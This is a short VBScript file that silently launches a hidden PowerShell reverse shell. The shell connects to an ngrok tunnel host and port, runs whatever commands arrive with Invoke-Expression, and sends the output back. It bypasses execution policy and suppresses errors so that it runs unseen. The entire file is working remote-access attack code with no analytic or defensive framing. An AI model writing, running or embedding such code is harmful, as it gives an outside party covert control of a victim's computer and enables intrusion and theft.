Set objShell = CreateObject("WScript.Shell")

    ' PowerShell script content as a single line, using double quotes for inner strings
    ps1Content = "$ErrorActionPreference = 'SilentlyContinue';"
    ps1Content = ps1Content & "$h = '0.tcp.ap.ngrok.io';" ' 
    ps1Content = ps1Content & "$p = 18585;" ' 
    ps1Content = ps1Content & "try {$client = New-Object System.Net.Sockets.TcpClient($h, $p);"
    ps1Content = ps1Content & "$stream = $client.GetStream();"
    ps1Content = ps1Content & "$writer = New-Object System.IO.StreamWriter($stream);"
    ps1Content = ps1Content & "$reader = New-Object System.IO.StreamReader($stream);"
    ps1Content = ps1Content & "$writer.AutoFlush = $true;"
    ps1Content = ps1Content & "$writer.WriteLine('Connected to $($h):$($p)');"
    ps1Content = ps1Content & "while ($true) {"
    ps1Content = ps1Content & "$command = $reader.ReadLine();"
    ps1Content = ps1Content & "if ([string]::IsNullOrWhiteSpace($command)) { continue };"
    ps1Content = ps1Content & "if ($command -eq 'exit') { break };"
    ps1Content = ps1Content & "$result = try {Invoke-Expression $command 2>&1 | Out-String} catch {$_.Exception.Message};"
    ps1Content = ps1Content & "$writer.WriteLine($result);"
    ps1Content = ps1Content & "$writer.Write('PS> ');};"
    ps1Content = ps1Content & "$client.Close();} catch {$_.Exception.Message;}"

    ' Double quote escaping for VBScript
    ps1Content = Replace(ps1Content, """", """""")

    ' Run the PowerShell script
    objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command """ & ps1Content & """", 0, False
    
